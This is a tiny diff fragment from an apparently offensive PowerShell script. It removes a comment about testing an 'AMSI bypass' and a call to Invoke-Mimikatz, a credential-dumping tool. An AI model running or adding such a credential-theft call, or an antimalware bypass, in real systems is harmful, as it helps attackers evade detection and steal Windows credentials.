@@ -9,6 +9,4 @@ $scriptText -split "`r?`n" | ForEach-Object {
     }
 }
 
-#test the AMSI bypass
-Invoke-Mimikatz
 
